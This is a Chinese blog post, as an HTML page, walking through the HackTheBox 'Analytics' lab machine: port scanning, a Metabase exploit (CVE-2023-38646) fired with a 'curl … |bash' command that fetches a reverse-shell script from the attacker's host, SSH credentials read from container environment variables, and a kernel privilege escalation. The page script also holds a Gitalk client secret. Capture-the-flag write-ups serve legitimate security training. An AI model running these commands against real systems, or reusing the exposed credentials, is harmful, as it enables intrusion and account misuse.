@@ -1,0 +1,287 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackTheBox—Analytics靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="HackTheBox—Analytics靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="打靶训练第六台
+这台靶机的难度应该是目前最简单的一台了，利用的都是比较新的CVE漏洞。
+简介
+一台新的Linux机器，在HTB官方难度为easy模式。
+信息收集
+启动靶机 确定靶机IP 然后测试本地与靶机的连接性。
+
+
+测试连接成功。
+使用..." />
+    <meta name="keywords" content="HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              HackTheBox—Analytics靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-11
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>打靶训练第六台</p>
+<p>这台靶机的难度应该是目前最简单的一台了，利用的都是比较新的CVE漏洞。</p>
+<h2 id="简介">简介</h2>
+<p>一台新的Linux机器，在HTB官方难度为easy模式。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>启动靶机 确定靶机IP 然后测试本地与靶机的连接性。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011182526515.png" alt="image-20231011182526515" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011182552362.png" alt="image-20231011182552362" loading="lazy"></figure>
+<p>测试连接成功。</p>
+<p>使用nmap对 靶机进行开放端口扫描</p>
+<pre><code>nmap -sV 10.10.11.233
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011182805030.png" alt="image-20231011182805030" loading="lazy"></figure>
+<p>开放端口为 22 和 80端口。</p>
+<p>访问靶机 80端口。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011183044431.png" alt="image-20231011183044431" loading="lazy"></figure>
+<p>感觉是一个静态的前端页面，也没有得到建站CMS类型。</p>
+<p>除了有一个登录口 进入登录口的界面。</p>
+<p>使用路径扫描 看是否可以得到敏感信息。</p>
+<pre><code>dirsearch -u http://analytical.htb/
+</code></pre>
+<p>没有得到什么有效的路径信息。</p>
+<p>尝试进行下host碰撞 将登录口跳转的data 子域名配合靶机的IP加入host文件中。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011193815543.png" alt="image-20231011193815543" loading="lazy"></figure>
+<p>成功访问</p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>是Metabase 感觉是一个组件。直接谷歌查找一下有没有相关漏洞</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011193931275.png" alt="" loading="lazy"></figure>
+<p>有新鲜的漏洞信息。</p>
+<p>国外有位师傅写了利用工具</p>
+<p>https://github.com/robotmikhro/CVE-2023-38646</p>
+<p>访问链接将工具下载下来。</p>
+<p>首先在目录下一个反弹shell，然后启动服务。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011200542217.png" alt="image-20231011200542217" loading="lazy"></figure>
+<p>然后使用下载下来的工具</p>
+<pre><code>python3 single.py -u http://data.analytical.htb -c 'curl 10.10.14.30/1.sh |bash'
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011200615091.png" alt="image-20231011200615091" loading="lazy"></figure>
+<p>注意<strong>1.sh</strong> 和 <strong>|</strong> 之间要加空格 我开始打的时候 忘了加空格 结果半天没有反弹shell。</p>
+<p>然后启动监听服务。</p>
+<p>成功反弹shell。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011200739053.png" alt="image-20231011200739053" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011201601186.png" alt="image-20231011201601186" loading="lazy"></figure>
+<p>发现有docker 的env文件 那么现在多半是在一个docker的容器里面。</p>
+<p>输入env查看当前环境</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011202029976.png" alt="image-20231011202029976" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011202143513.png" alt="image-20231011202143513" loading="lazy"></figure>
+<p>开始还没发现。这个其实就是ssh的账号和密码</p>
+<pre><code>META_USER=metalytics   
+META_PASS=An4lytics_ds20223#
+</code></pre>
+<p>成功连接ssh。</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011202512841.png" alt="image-20231011202512841" loading="lazy"></figure>
+<h2 id="权限提升">权限提升</h2>
+<p>这里没有suid 和sudo -l直接尝试内核提权。</p>
+<pre><code>uname -a
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011202627031.png" alt="image-20231011202627031" loading="lazy"></figure>
+<p>感觉是一个比较新的版本了。</p>
+<p>使用kali里面的漏洞库进行提权 感觉不太现实。于是直接去谷歌查找最新漏洞。</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011201159654.png" alt="image-20231011201159654" loading="lazy"></figure>
+<p>最后成功找到相关方案</p>
+<p>https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/</p>
+<p>https://cn-sec.com/archives/2062358.html</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011203550364.png" alt="image-20231011203550364" loading="lazy"></figure>
+<p>成功反弹回来root权限。</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231011203856454.png" alt="image-20231011203856454" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>这台机器难度比较简单 前期通过nday getshell但是那个时候 我们进去的是docker 容器里面 需要查找env配置文件得到ssh连接的账号密码。真正的拿下机器的普通用户权限。然后通过内核提权的方式进行权限提升。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/hackthebox-cozyhosting-ba-ji/">
+              <h3 class="post-title">
+                HackTheBox—CozyHosting靶机
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
